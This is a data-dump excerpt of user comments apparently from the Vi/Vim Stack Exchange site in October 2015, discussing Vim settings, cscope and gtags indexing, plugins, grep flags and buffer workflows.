  <row Id="7555" PostId="4959" Score="0" Text="Thank you! The output of encoding is `encoding=utf-8`. Thank you, i replaced showbreak symbol. But regarding lcs-eol, it seems that there is no command to null this setting, only one way to do this is to redefine the eol symbol." CreationDate="2015-10-02T12:44:08.760" UserId="4730" />
  <row Id="7556" PostId="4954" Score="0" Text="Using debian 14.04." CreationDate="2015-10-02T14:26:32.157" UserId="4667" />
  <row Id="7557" PostId="4954" Score="0" Text="I have two vims, the regular one, which has no perl support and vim.gtk which does.    vim.gtk -Nes filename &lt;&lt; EOF etc works just like ex filename &lt;&lt; EOF.     However, when I type a perl command at the question mark prompt, I don't get the same response as when I'm inside of vim.gtk.    For example the first perl command I want to write is :perl $a{'{'}=1.      When I type this at the question mark prompt, with or without the :, I crash out with the error   a: undefined variable.    When I type it from within vim.gtk, the command works fine.    Could you please advise?     Thanks" CreationDate="2015-10-02T14:31:24.407" UserId="4667" />
  <row Id="7558" PostId="4957" Score="0" Text="@edi9999 `cscope` itself supports C/C++, Lex, and Yacc.  The support for Java is marginally useful.  You can get support for (old-style) PHP and JavaScript from GNU `global`, via the `gtags-cscope` utility.  And, as I said above, there are other indexers that can export `cscope`-compatible databases." CreationDate="2015-10-02T16:36:03.443" UserId="2313" />
  <row Id="7559" PostId="4956" Score="1" Text="@romainl Nope, `cscope` itself supports neither PHP, nor JavaScript.  You can however index PHP and JavaScript files with GNU `global`, then run `gtags-cscope` to use the resulting `gtags` file with `cscope`." CreationDate="2015-10-02T16:40:48.830" UserId="2313" />
  <row Id="7560" PostId="4959" Score="3" Text="`:set nolist` :P" CreationDate="2015-10-02T17:33:13.230" UserId="1800" />
  <row Id="7561" PostId="4945" Score="7" Text="Good thing the free key wasn't `w` ..." CreationDate="2015-10-02T17:33:58.090" UserId="1800" />
  <row Id="7562" PostId="4966" Score="7" Text="Yep, you can't abolish tits - it's a sin." CreationDate="2015-10-02T17:43:38.340" UserId="1800" />
  <row Id="7564" PostId="4956" Score="0" Text="@SatoKatsura, yes, cscope [supports JavaScript](http://imgur.com/ndwAK4q) (and CSS, appparently)." CreationDate="2015-10-02T18:43:45.310" UserId="54" />
  <row Id="7565" PostId="4956" Score="0" Text="and [PHP](http://imgur.com/GLqQ5vp) too." CreationDate="2015-10-02T19:01:59.640" UserId="54" />
  <row Id="7566" PostId="4644" Score="0" Text="Would &quot;there isn't one&quot; be a fair summary of this answer?" CreationDate="2015-10-02T19:46:04.383" UserId="4674" />
  <row Id="7567" PostId="4967" Score="0" Text="Cool!: Vim is always a surprise to me! (+1)" CreationDate="2015-10-02T20:37:48.820" UserId="3002" />
  <row Id="7568" PostId="4968" Score="0" Text="What about `Ctrl-C`?" CreationDate="2015-10-02T22:29:26.983" UserId="2961" />
  <row Id="7569" PostId="4970" Score="0" Text="It's mentioned as one of the default values for [`'runtimepath'`](http://vimhelp.appspot.com/options.txt.html#%27runtimepath%27)." CreationDate="2015-10-03T07:19:20.283" UserId="205" />
  <row Id="7570" PostId="4967" Score="0" Text="The main strategy is the most important part of the answers. One minor thing: if I understand correctly, the result is correct if last char belongs to clsktb; otherwise is incremented by 1." CreationDate="2015-10-03T10:13:27.257" UserId="3002" />
  <row Id="7572" PostId="4972" Score="4" Text="be carefull with`\=`" CreationDate="2015-10-03T14:07:31.857" UserId="3002" />
  <row Id="7573" PostId="4970" Score="1" Text="That's a good tip about `vimrc`. I might move mine in there to keep everything in one place." CreationDate="2015-10-03T14:38:29.680" UserId="4674" />
  <row Id="7574" PostId="4972" Score="0" Text="My earlier comment was just ignorant, sorry. JJoao is quite right: the second, very magic pattern needs to be `\vclass\=.(vvv)@!`." CreationDate="2015-10-03T15:13:54.543" UserId="2942" />
  <row Id="7575" PostId="4970" Score="1" Text="@ssdecontrol definitely recommended. Makes keeping your stuff in version control easier." CreationDate="2015-10-03T15:36:22.597" UserId="205" />
  <row Id="7576" PostId="4970" Score="0" Text="@muru I already have everything [symlinked to a Git repo](https://github.com/gwerbin/dotfiles), but I like a clean home directory regardless." CreationDate="2015-10-03T15:49:51.087" UserId="4674" />
  <row Id="7577" PostId="4972" Score="1" Text="@JJoao you might want to turn your comment along with Peter's comment into an answer, so that I can accept it." CreationDate="2015-10-03T18:02:54.390" UserId="985" />
  <row Id="7578" PostId="4956" Score="2" Text="@romainl You should consider looking at `cscope`'s [sources](http://sourceforge.net/project/showfiles.php?group_id=4664) instead of speculating based on quick experiments.  `cscope` has a rather relaxed C parser.  That's all it has, and all it does.  With that parser it &quot;supports&quot; a lot of languages, for suitable values of &quot;support&quot;.  Constructs are recognized as long as they look more or less like C.  Which is why f.i. Java classes and newer PHP constructs are not recognized.  Compare f.i. with [starscope](https://github.com/eapache/starscope/), which actually allows adding new languages." CreationDate="2015-10-03T20:36:47.797" UserId="2313" />
  <row Id="7580" PostId="4961" Score="0" Text="I don't think `grep -v` gives you the exit code you want. But `! grep` should do it." CreationDate="2015-10-04T11:39:11.603" UserId="630" />
  <row Id="7581" PostId="3811" Score="0" Text="I use this but I trigger on `js` and `coffee` files too. Because I find myself completing CSS classes often in Javascript, and I rarely have code that performs subtraction without a space. In code I edit, `diff = foo - bar;` is more common than `diff=foo-bar;`" CreationDate="2015-10-04T11:45:45.420" UserId="630" />
  <row Id="7582" PostId="4974" Score="0" Text="Simpler `autocmd`: http://stackoverflow.com/a/9381778/2072269. Related: [Can Vim add to the X11 clipboard or primary buffers without an external utility?](http://vi.stackexchange.com/q/3769/205)." CreationDate="2015-10-04T13:01:41.863" UserId="205" />
  <row Id="7583" PostId="4961" Score="0" Text="If that's the case then you don’t even need the `-v` just the `!`." CreationDate="2015-10-04T13:37:15.813" UserId="544" />
  <row Id="7584" PostId="4975" Score="4" Text="Try adding it to `~/.vim/after/syntax/c.vim` instead." CreationDate="2015-10-04T14:55:17.973" UserId="205" />
  <row Id="7585" PostId="4961" Score="0" Text="Exactly. You could edit your answer to make that correction." CreationDate="2015-10-04T20:23:10.417" UserId="630" />
  <row Id="7586" PostId="4977" Score="6" Text="So you have crap in your vimrc, but you don't want to show it." CreationDate="2015-10-04T22:06:21.837" UserId="1800" />
  <row Id="7587" PostId="4977" Score="0" Text="@VanLaser I would gladly show it. But it has nothing to do with the question, as I mentioned above. You can look at my vimrc, and all of the related [fiels](https://github.com/amjames/dotfiles) they are in the vim directory. Perhaps after if you have something constructive to add you can grace us with your infinite wisdom on my &quot;crap&quot;. Thanks for your help" CreationDate="2015-10-05T00:05:42.543" UserId="4692" />
  <row Id="7588" PostId="4977" Score="0" Text="@Ajay can you reproduce this behaviour with `vim -Nu NONE`?" CreationDate="2015-10-05T00:30:00.167" UserId="205" />
  <row Id="7589" PostId="4977" Score="0" Text="@muru no, when I use that I get the behavior that I would like, not what i have described above. Does this suggest that something in my `.vimrc` is causing the undesired behavior?" CreationDate="2015-10-05T00:33:25.930" UserId="4692" />
  <row Id="7590" PostId="4977" Score="3" Text="@Ajay It does, indeed." CreationDate="2015-10-05T00:33:49.673" UserId="205" />
  <row Id="7591" PostId="4977" Score="0" Text="I have found the cause and posted an answer below that explains it. Thanks for your constructive response @muru I wouldn't have been able to find the source without your help!" CreationDate="2015-10-05T00:49:49.413" UserId="4692" />
  <row Id="7592" PostId="4977" Score="6" Text="So that was crap in your vimrc, after all." CreationDate="2015-10-05T05:06:01.447" UserId="54" />
  <row Id="7593" PostId="4978" Score="1" Text="Interesting.  I don't even use remapping because I like keeping my habits fully portable as a sysadmin, but this is good to know." CreationDate="2015-10-05T08:05:41.993" UserId="4676" />
  <row Id="7594" PostId="4966" Score="0" Text="I'm not sure because I don't use the plugin but on the readme it seems that `:Abolish` is used to create mappings with several possibilities with `{foo, bar}`. What you're trying to do is a simple abbreviation which doesn't need the plugin so maybe that's why you get a weird behavior? **Edit** I just installed it and your command works good for me. Maybe something create a conflict in your vimrc." CreationDate="2015-10-05T12:31:48.653" UserId="1841" />
  <row Id="7595" PostId="4964" Score="1" Text="Do note that this requires a vim build that has perl support enabled." CreationDate="2015-10-05T12:48:03.303" UserId="865" />
  <row Id="7596" PostId="4964" Score="0" Text="@EvergreenTree, thank you, I always forget to say that." CreationDate="2015-10-05T13:24:34.437" UserId="3002" />
  <row Id="7597" PostId="4966" Score="1" Text="@statox, you also use latex suite? Abolish is still useful in this case because it provides case insensitivity. My solution now is to drop latex suite, which is messy and most of which I never used anyway." CreationDate="2015-10-05T13:41:36.373" UserId="4505" />
  <row Id="7598" PostId="4966" Score="0" Text="@Lawrence: I don't usually use any of these 2 plugins I installed [latex-suite](https://github.com/gerw/vim-latex-suite) (can you confirm it's the good one?) and abolish to test your usecase and unfortunately couldn't reproduce your problem (so I can't help to find a solution, sorry). It is usually a good thing to get rid of plugins you don't really use, even if here it is not a real solution :-)" CreationDate="2015-10-05T14:52:40.437" UserId="1841" />
  <row Id="7599" PostId="4956" Score="0" Text="@SatoKatsura, I wouldn't call daily usage &quot;quick experiment&quot;. Whether support for JavaScript is intended or not doesn't really matter: cscope works with JavaScript and that's all that matters to the end user." CreationDate="2015-10-05T15:01:14.240" UserId="54" />
  <row Id="7600" PostId="4982" Score="1" Text="Thanks! I had the `noremap` stuff backwards. Although I'm already getting used to `&lt;leader&gt;o` and `&lt;leader&gt;O`..." CreationDate="2015-10-05T19:21:08.683" UserId="4674" />
  <row Id="7601" PostId="4966" Score="0" Text="@statox, the version you tried doesn’t seem to be the original, which is here: http://vim-latex.sourceforge.net --. but it says improved, so it is probably better. thanks for trying!" CreationDate="2015-10-05T21:55:04.740" UserId="4505" />
  <row Id="7602" PostId="4975" Score="0" Text="@muru Yes, it works. But how about adding it to `.vimrc`?" CreationDate="2015-10-06T03:54:15.580" UserId="4754" />
  <row Id="7603" PostId="4882" Score="0" Text="It turned out to be a double-edged sword, as vim started to treat long function names as separate words. For example, a python function called ,,download_and_print()&quot; is going to have colored ,,and'' - as this is a language keyword. It's also impossible to navigate with */# between function calls. I know it wasn't the part of the question, but wanted to mention this." CreationDate="2015-10-06T07:54:24.833" UserId="2562" />
  <row Id="7604" PostId="4975" Score="0" Text="You'd probably have to use something like `autocmd BufEnter *.c hl ...`, but you should keep it in `after/syntax/c.vim`. Any modern version of Vim will understand the `.vim/after/` directory. On Windows, the path would be `vimfiles/after/...`, so portability shouldn't be much of an issue (especially if you use any plugins)." CreationDate="2015-10-06T08:54:48.583" UserId="205" />
  <row Id="7605" PostId="4882" Score="0" Text="@zmarszczony my function highlighting works fine, but `*`/`#` is gone." CreationDate="2015-10-06T09:05:46.603" UserId="205" />
  <row Id="7606" PostId="4975" Score="0" Text="@muru OK, thanks very much!" CreationDate="2015-10-06T10:10:13.827" UserId="4754" />
  <row Id="7607" PostId="4983" Score="0" Text="Hi. First, if you have a particular issue with vimtex, please don't hesitate to open an issue on github. So, do I understand correctly that the main file, that is, the one you would initiate compilation with, is the file `0_preamble/0_preamble.tex`?" CreationDate="2015-10-06T11:11:15.110" UserId="21" />
  <row Id="7608" PostId="4983" Score="0" Text="Hmm, no, I see you include it in the master file with `subimport`. I've not heard of this command, but it explains why things don't work with vimtex. If you want support in vimtex, you must open an issue and explain what `subimport` is. I'll consider to add the feature." CreationDate="2015-10-06T11:17:42.797" UserId="21" />
  <row Id="7609" PostId="388" Score="0" Text="http://stackoverflow.com/questions/2458398/packageplugin-management-for-vim" CreationDate="2015-10-06T11:32:48.090" UserId="2038" />
  <row Id="7611" PostId="4989" Score="2" Text="It may be easier to let the `help` buffer unlisted, and use `:ls!` and `:buffer &lt;number&gt;` to jump to an existing help buffer instead." CreationDate="2015-10-06T13:39:46.913" UserId="1800" />
  <row Id="7612" PostId="4983" Score="0" Text="Hi, I didn't think at first to have any issues with vimtex. It was more a question about how to use it and set it up for it to work with my project. `subimport` is part of the  `import` package, which allows to have a file structure like the one shown. The main file is `_master.tex`: it's from there where the compilation starts. Thanks for the comments, I will open an issue." CreationDate="2015-10-06T13:45:54.293" UserId="2977" />
  <row Id="7613" PostId="4993" Score="0" Text="Thanks for this feedback. Will have a look." CreationDate="2015-10-06T14:26:22.017" UserId="3357" />
  <row Id="7614" PostId="4991" Score="0" Text="Here are the things I've done to get `gtags-cscope` to work properly within Vim. Execute `cs add GTAGS &lt;project-directory&gt; -a` where `&lt;project-directory&gt;` is the name of the directory in which `gtags` was run and in which `GTAGS` resides. The `-a` flag tells `gtags-cscope` to output absolute file names. Also `let $GTAGSDBPATH = &lt;project-directory&gt;` and `let $GTAGSROOT = &lt;project-directory&gt;`." CreationDate="2015-10-06T15:49:53.807" UserId="2055" />
  <row Id="7615" PostId="4994" Score="2" Text="Really ? *Each* time you leave insert mode?" CreationDate="2015-10-06T16:14:42.747" UserId="54" />
  <row Id="7616" PostId="4995" Score="1" Text="You are using tab pages the wrong way. You should get used to buffers and arguments instead. Related: http://stackoverflow.com/questions/26708822/why-do-vim-experts-prefer-buffers-over-tabs/26710166#26710166" CreationDate="2015-10-06T16:36:41.873" UserId="54" />
  <row Id="7617" PostId="4994" Score="0" Text="@romainl I guess it's a quick way to tidy things up. For example, if I paste code into vim from my system clipboard the formatting may not be quite right" CreationDate="2015-10-06T16:45:08.537" UserId="4771" />
  <row Id="7618" PostId="4995" Score="1" Text="I agree with @romainl. Some links on buffer usage: [Using Vim's tabs like buffers](http://stackoverflow.com/a/103590/438329), [Why do Vim experts prefer buffers over tabs?](http://stackoverflow.com/q/26708822/438329), and [Use buffers effectively](http://stackoverflow.com/a/21338192/438329). [Vimcasts](http://vimcasts.org/) links about arglist usage: [Meet the arglist](http://vimcasts.org/episodes/meet-the-arglist/) and [Populating the arglist](http://vimcasts.org/episodes/populating-the-arglist/)" CreationDate="2015-10-06T16:56:48.783" UserId="778" />
  <row Id="7619" PostId="4995" Score="0" Text="Thanks, I will look into tabs.  The vim journey continues!" CreationDate="2015-10-06T18:25:40.960" UserId="4761" />
  <row Id="7620" PostId="4995" Score="0" Text="I've found https://github.com/ap/vim-buftabline to be the simplest way display buffers in a similar way to tabs" CreationDate="2015-10-06T18:46:06.270" UserId="4761" />
  <row Id="7621" PostId="4994" Score="2" Text="@alidrongo Note that to paste code from your system to vim you are not necessarily in insert mode (e.g. `&quot;+p` in normal mode). A solution could be to trigger the command only when you write the buffer to the file." CreationDate="2015-10-06T19:29:48.330" UserId="1841" />
  <row Id="7622" PostId="4995" Score="0" Text="I always find it amazing how difficult it is for people to abandon their notion of 1 file = 1 tab, especially among those who have accepted modal editing." CreationDate="2015-10-06T20:08:19.303" UserId="778" />
  <row Id="7623" PostId="4995" Score="1" Text="It's not the concepts that are hard, and you can pry the modal editing from my cold dead fingers.  But I find it very useful to be able to see which 5 or so files I have open in a window without having to switch to that window." CreationDate="2015-10-06T20:14:26.443" UserId="4761" />
  <row Id="7624" PostId="4993" Score="0" Text="+1 for snipmate even despite your typo!" CreationDate="2015-10-06T20:39:26.843" UserId="1406" />
  <row Id="7625" PostId="4961" Score="0" Text="1. You should use `-F` so that `grep` dosn't interpret characters as regular expressions, and 2. Use `-q` instead of redirecting to `/dev/null`. See my [earlier comment on question](http://vi.stackexchange.com/questions/4847/how-to-append-some-line-at-the-end-of-the-file-only-if-its-not-there-yet#comment7407_4847)." CreationDate="2015-10-06T22:06:01.320" UserId="205" />
  <row Id="7626" PostId="4989" Score="0" Text="Thanks, but choose not this way bec. want to have help listed." CreationDate="2015-10-07T01:18:35.150" UserId="4617" />
  <row Id="7627" PostId="5000" Score="1" Text="https://github.com/beloglazov/vim-textobj-quotes says it supports multiple lines. (Requires https://github.com/kana/vim-textobj-user)" CreationDate="2015-10-07T04:41:00.733" UserId="46" />
  <row Id="7628" PostId="3858" Score="0" Text="I want to balance @lcd047's comment by saying that I have the complete opposite experience. I had been sort of half way to touch typing for several years, keeping slipping back into old habits, till i started to use vim. To me, one of the benefits of using vim is precieley that its system of navigation and commands with simple keys, for example `jkl;`, forces you to keep your hands steady in good touch typing position in order to navigate the text. I am now a much quicker and more accurate typist as a result." CreationDate="2015-10-07T05:45:48.933" UserId="3316" />
  <row Id="7629" PostId="4991" Score="0" Text="@garyjohn I add `cs add GTAGS $PWD` to solve this problem now. However, you have to open vim under the root directory of the project." CreationDate="2015-10-07T07:45:30.930" UserId="4754" />
  <row Id="7630" PostId="4995" Score="0" Text="... a workflow that simply doesn't work with many files. I currently have 50 buffers listed and there's no way a tab-based workflow would scale, in Vim or any other editor." CreationDate="2015-10-07T08:08:08.047" UserId="54" />
  <row Id="7631" PostId="4997" Score="0" Text="Great stuff. One further question (I'm pretty early on my vim journey): I have some logic that selects the kind of beautification based on the file type:&#xA; `map &lt;c-f&gt; :call JsBeautify()&lt;cr&gt;&#xA;&quot; or&#xA;autocmd FileType javascript noremap &lt;buffer&gt;  &lt;c-f&gt; :call JsBeautify()&lt;cr&gt;&#xA;&quot; for html&#xA;autocmd FileType html noremap &lt;buffer&gt; &lt;c-f&gt; :call HtmlBeautify()&lt;cr&gt;&#xA;&quot; for css or scss&#xA;autocmd FileType css noremap &lt;buffer&gt; &lt;c-f&gt; :call CSSBeautify()&lt;cr&gt;&#xA;`    Is there a way I can do this also automatically? Many thanks!" CreationDate="2015-10-07T09:45:08.120" UserId="4771" />
  <row Id="7632" PostId="5008" Score="0" Text="thanks romainl, it worked exactly as you said! interesting that the setting persisted that way. vim usually flushes all settings - not saved into `vimrc` at shutdown." CreationDate="2015-10-07T11:55:36.363" UserId="4603" />
  <row Id="7633" PostId="5008" Score="0" Text="Do you use sessions?" CreationDate="2015-10-07T12:25:41.543" UserId="54" />
  <row Id="7634" PostId="5008" Score="0" Text="no, I dont know what sessions are. do you recommend them?" CreationDate="2015-10-07T12:28:43.443" UserId="4603" />
  <row Id="7635" PostId="4991" Score="1" Text="Or you could have Vim figure out what the root directory of the current project is and set the third argument to `cs add` accordingly. How you do that depends on how and where you start Vim and on how your projects are structured. I have a script that uses the directory in which Vim starts to figure out the current project directory. If no project directory is found, as when starting Vim in $HOME, then the script uses the full path of the first file opened in a project to determine the project directory. There are also some scripts at `vim.sourceforge.net` for doing this." CreationDate="2015-10-07T14:29:10.773" UserId="2055" />
  <row Id="7637" PostId="5002" Score="1" Text="Thanks for your answer. The justification of the end of line comment is exactly what I was looking for. I'll test the syntax-based approach first because I think it is pretty smart and if I'm not satisfied I'll see how to use FDinoff plugin." CreationDate="2015-10-07T14:48:33.103" UserId="1841" />
  <row Id="7638" PostId="4997" Score="0" Text="@alidrongo: I edited my answer I think the best way to do what you want is to use an `augroup` containing one autocommand by function to call." CreationDate="2015-10-07T15:02:55.520" UserId="1841" />
  <row Id="7640" PostId="5011" Score="0" Text="Note that the `^X^F` completion doesn't use bash, it's built in to Vim itself." CreationDate="2015-10-07T15:19:00.040" UserId="51" />
  <row Id="7641" PostId="5011" Score="2" Text="From a quick reading of the source, it seems that this is not possible. In `edit.c`, `ins_compl_get_exp()` is called, which expands all environment variables (as well as patterns like `%:h`). On the next line, the tilde seems to be actually *re-added* with `tilde_replace()`... You could override the `^X^F` completion with your own version though..." CreationDate="2015-10-07T15:28:19.710" UserId="51" />
  <row Id="7642" PostId="4974" Score="1" Text="Use a clipboard manager" CreationDate="2015-10-07T15:42:53.747" UserId="71" />
  <row Id="7643" PostId="5011" Score="0" Text="I see what you mean: https://github.com/vim/vim/blob/master/src/edit.c#L4398" CreationDate="2015-10-07T16:44:12.873" UserId="4498" />
  <row Id="7644" PostId="5002" Score="0" Text="You're welcome; my gain is that it made me give a better look to the typographic quotes plugin (by `reedes`)." CreationDate="2015-10-07T17:37:32.340" UserId="1800" />
  <row Id="7645" PostId="5011" Score="0" Text="AFAIK Shougo's [neocomplete](https://github.com/Shougo/neocomplete.vim) will do what you want, by default, using its `file` completion source." CreationDate="2015-10-07T20:50:11.010" UserId="1800" />
  <row Id="7646" PostId="4961" Score="0" Text="Good points. Curious how portable is `-q` and `-F` options? I thought the `&gt;/dev/null` was more universal among different platforms (sun vs hp vs Mac OS X vs Ubuntu vs FreeBSD vs …)" CreationDate="2015-10-07T21:46:28.810" UserId="544" />
  <row Id="7648" PostId="5013" Score="3" Text="[One of my tools](https://bitbucket.org/Carpetsmoker/password-bunny/src/ca2199b79aa7c053690726993549e30dc6b2d02f/pwbunny?at=default&amp;fileviewer=file-view-default) does this by pre-processing the arguments in a shell script, rather than VimScript. I don't know if this works well for your specific use-case, but it certainly saves you from re-implementing `getopt` in VimScript..." CreationDate="2015-10-07T23:15:58.250" UserId="51" />
  <row Id="7649" PostId="4991" Score="0" Text="@garyjohn Yes, scripts like that will be helpful and convenient. Thanks very much!" CreationDate="2015-10-08T00:36:52.807" UserId="4754" />
  <row Id="7650" PostId="2137" Score="0" Text="Great!  I learned points 6 and 2 a while ago; those are IMO the most important.  I came here to document these but you beat me to it ;)" CreationDate="2015-10-08T04:52:05.033" UserId="4676" />
  <row Id="7651" PostId="5013" Score="5" Text="Much as I love vim, it is a text editor, not a true scripting language.  The best hydraulic cutting machine in the world still makes a poor three-ring hole punch." CreationDate="2015-10-08T05:23:36.867" UserId="4676" />
  <row Id="7652" PostId="5015" Score="4" Text="I read the guidelines on subjective questions and I think this fits." CreationDate="2015-10-08T05:32:08.543" UserId="4676" />
  <row Id="7653" PostId="5016" Score="0" Text="The real crux of my question is &quot;How&quot; regarding point 1 of your answer.  Have you had any experiences showing this to others or being shown yourself?" CreationDate="2015-10-08T06:58:06.907" UserId="4676" />
  <row Id="7654" PostId="5016" Score="0" Text="Not so much demonstrating, but I use small vim scripts routinely to clean up text, but like you I haven't much interest from colleagues (they prefer to dump output into massive documents that nobody reads)" CreationDate="2015-10-08T07:24:52.193" UserId="398" />
  <row Id="7655" PostId="5019" Score="0" Text="Thank you. It resolved my issue." CreationDate="2015-10-08T10:02:25.977" UserId="3254" />
  <row Id="7656" PostId="5019" Score="0" Text="Or actually it resolved my issue when typing &quot;set textwidth=0&quot; into vim. When I typed it into my .vimrc - the issue still happens. Any idea why?" CreationDate="2015-10-08T10:30:37.403" UserId="3254" />
  <row Id="7657" PostId="5019" Score="0" Text="I use Majutsushi TagBar, and NERDTree plugins." CreationDate="2015-10-08T10:31:11.287" UserId="3254" />
  <row Id="7658" PostId="5015" Score="5" Text="Suggested keyword: vim-evangelism. Only semi-jokingly." CreationDate="2015-10-08T11:06:06.523" UserId="3316" />
  <row Id="7659" PostId="5020" Score="0" Text="http://superuser.com/q/207264/85228" CreationDate="2015-10-08T12:06:24.920" UserId="71" />
  <row Id="7660" PostId="5021" Score="0" Text="thanks. I'm already using relative line number a lot. Thanks for tips." CreationDate="2015-10-08T12:11:11.553" UserId="3357" />
  <row Id="7661" PostId="5020" Score="0" Text="Your file is encoded in ISO 8859. Is it possible to convert your file to UTF-8?" CreationDate="2015-10-08T12:23:39.983" UserId="350" />
  <row Id="7662" PostId="5019" Score="0" Text="Try putting it at the bottom of your .vimrc" CreationDate="2015-10-08T12:31:45.637" UserId="1543" />
  <row Id="7663" PostId="5019" Score="0" Text="To check the value at run time, just type `set tw`, so you can check if it's actually 0 or not." CreationDate="2015-10-08T13:54:05.470" UserId="1296" />
  <row Id="7665" PostId="5020" Score="0" Text="@RaphaelAhrens I have tried setting `fileencoding` to `utf-8` but the problem remains. Will try Christians solution next." CreationDate="2015-10-08T14:31:28.760" UserId="4413" />
  <row Id="7666" PostId="4041" Score="0" Text="It looks like you're running `vim` as `vi`, which means it disables a bunch of features. Try `export EDITOR=vim` and run `git commit` again." CreationDate="2015-10-08T16:23:17.563" UserId="51" />
  <row Id="7667" PostId="4041" Score="0" Text="`git config --global core.editor vim` works for me" CreationDate="2015-10-08T14:57:20.700" UserId="4797" />
  <row Id="7668" PostId="5028" Score="1" Text="Why don't you try [the issue tracker](https://github.com/tomtom/tcomment_vim/issues)?" CreationDate="2015-10-08T17:51:33.170" UserId="1405" />
  <row Id="7669" PostId="5023" Score="2" Text="Just wondering: do you write your email in vim as well? (I do!)" CreationDate="2015-10-08T17:57:51.127" UserId="3368" />
  <row Id="7670" PostId="5024" Score="0" Text="awesome, thanks for this! I can get it to work for straight functions, but not for methods, e.g. it doesnt work on `$dbh-&gt;prepare($sql)` whereas vims builtin omni complete does provide assistance for `prepare()` - when its called on an object (but wont if its not used in an object context)" CreationDate="2015-10-08T19:05:19.327" UserId="4603" />
  <row Id="7671" PostId="5023" Score="2" Text="@Oliphaunt I do write emails in VIM. My email client of choice is MUTT and when I edit or create a new email, it opens my editor of choice. I even use VIM for adding URLS to my RSS feed reader (newsbeuter)." CreationDate="2015-10-08T19:12:12.383" UserId="1417" />
  <row Id="7672" PostId="5031" Score="0" Text="Seems like we get the same answer at some seconds of difference :-) But I have a question: Why do you suggest to use `&lt;C-z&gt;` as `wildcharm` and not `&lt;Tab&gt;` as OP wanted? Is it just a personal preference or is there another reason?" CreationDate="2015-10-08T19:22:23.667" UserId="1841" />
  <row Id="7673" PostId="5031" Score="1" Text="1. That's the value suggested in the doc. 2. `wildcharm` is only used in mappings anyway so it makes sense to use a *special* value to prevent confusion." CreationDate="2015-10-08T19:33:17.653" UserId="54" />
  <row Id="7674" PostId="5031" Score="0" Text="My concern was more about incompatibility with other modes or this kind of stuff but your points make sense indeed." CreationDate="2015-10-08T19:37:11.927" UserId="1841" />
  <row Id="7675" PostId="5030" Score="0" Text="Thanks, @statox. That did the trick." CreationDate="2015-10-08T19:52:30.867" UserId="4808" />
  <row Id="7676" PostId="5031" Score="0" Text="Thanks, @romainl. statox beat you by only a minute. I went with the &lt;Tab&gt; as my wildcharm character" CreationDate="2015-10-08T19:55:03.877" UserId="4808" />
  <row Id="7677" PostId="5024" Score="0" Text="I should have been more clear it uses Vim builtin omni complete for functions via `g:php_builtin_functions`." CreationDate="2015-10-08T19:59:28.357" UserId="778" />
  <row Id="7678" PostId="5032" Score="1" Text="I don't know if it is relevant but maybe you should precise which OS you're using. Also I have the same behavior on a Debian with gVim 7.4." CreationDate="2015-10-08T20:21:56.947" UserId="1841" />
  <row Id="7679" PostId="5028" Score="0" Text="I can reproduce the problem on a Debian with vim 7.4 (both terminal and gVim). That might not be the best answer possible but you could give a try to [nerdCommenter](https://github.com/scrooloose/nerdcommenter) which doesn't have this problem." CreationDate="2015-10-08T21:27:30.700" UserId="1841" />
  <row Id="7680" PostId="5034" Score="0" Text="Thanks for this. I'm on Ubuntu with Gnome so I made a slight change: let g:netrw_browsex_viewer=&quot;setsid gnome-open&quot;" CreationDate="2015-10-08T21:35:36.207" UserId="4807" />
  <row Id="7681" PostId="5015" Score="0" Text="@Wildcard perhaps it does fit on subjective questions, but it really is too broad. See http://meta.vi.stackexchange.com/q/1278/205 for discussion we had on a similarly &quot;subjective&quot; question." CreationDate="2015-10-09T00:42:55.283" UserId="205" />
  <row Id="7682" PostId="5015" Score="0" Text="I see your point.  I read through that discussion (and several linked discussions).  I still think this question is appropriate, but I don't think I'm supposed to discuss that here; is there a place in meta where we should discuss it?" CreationDate="2015-10-09T01:38:32.497" UserId="4676" />
  <row Id="7683" PostId="5024" Score="0" Text="thats the weird thing, vim's builtin onmi-complete - for methods -  *does* work, but when I invoke the method signature with your snippet it doesnt work. just to repeat: you snippet works fine on builtin *functions* - its just methods that dont seem to work" CreationDate="2015-10-09T02:35:38.027" UserId="4603" />
  <row Id="7684" PostId="5038" Score="0" Text="I suspect that because they are times instead of integers, this specific action may have to be done with a shell command.  But it seems that simply adding *integers* should be possible natively in vim...." CreationDate="2015-10-09T04:13:05.010" UserId="4676" />
  <row Id="7685" PostId="5013" Score="2" Text="You probably don't want to use VimL as a general-purpose scripting language.  It's orders of magnitude slower than Python and Perl, and the API has a lot of limitations that make it unsuitable for many tasks." CreationDate="2015-10-09T05:16:53.450" UserId="2313" />
  <row Id="7686" PostId="5037" Score="1" Text="Vim has an odd way of parsing commands with optional arguments.  Wrapping the two `cscope` commands in `exec`s might produce better results." CreationDate="2015-10-09T06:04:56.210" UserId="2313" />
  <row Id="7687" PostId="5039" Score="0" Text="This solution is really note very &quot;native&quot;, but it is hacky. It is also not very adaptible and reusable (e.g. if you overwrite `a` with another macro)." CreationDate="2015-10-09T06:21:57.463" UserId="21" />
  <row Id="7688" PostId="5040" Score="0" Text="That do solves the problem but could you detail a little more your answer to explain why it works please? :-)" CreationDate="2015-10-09T06:52:55.780" UserId="1841" />
  <row Id="7689" PostId="5042" Score="2" Text="Shouldn't `command -bar` just work?" CreationDate="2015-10-09T07:11:21.367" UserId="71" />
  <row Id="7690" PostId="5040" Score="0" Text="@statox Not really.  It works because the code uses `g:tcomment#replacements_xml` for translations.  Now, why does the code do that for HTML files, is a good question.  A question you'd have to ask `tcomment`'s author though.  Personally I suspect it's a bug, but the author might disagree. :)" CreationDate="2015-10-09T07:12:38.700" UserId="2313" />
  <row Id="7691" PostId="5042" Score="0" Text="Ah, yes, you are right." CreationDate="2015-10-09T09:08:39.473" UserId="21" />
  <row Id="7695" PostId="5045" Score="0" Text="Thanks for the links, I enjoyed reading those.  :)" CreationDate="2015-10-09T13:13:53.017" UserId="4676" />
  <row Id="7696" PostId="5045" Score="1" Text="Your second paragraph is spot-on.  Except the pain is even worse when you see them *using vim*, in *insert mode*, and pressing the *arrow keys* to move right *to the end of the line*.  Arrrggh!  (I'm not making this up.)" CreationDate="2015-10-09T13:15:59.780" UserId="4676" />
  <row Id="7697" PostId="5046" Score="0" Text="Unfortunately, I do not think this is possible. The message is parsed with `%m`, and this can only be used once. I hope I am wrong, though!" CreationDate="2015-10-09T13:58:01.123" UserId="21" />
  <row Id="7698" PostId="5024" Score="0" Text="Since the snippet uses `g:php_builtin_functions` it has no support for methods, just functions. Please feel free to improve upon it to work for methods calls" CreationDate="2015-10-09T14:15:53.133" UserId="778" />
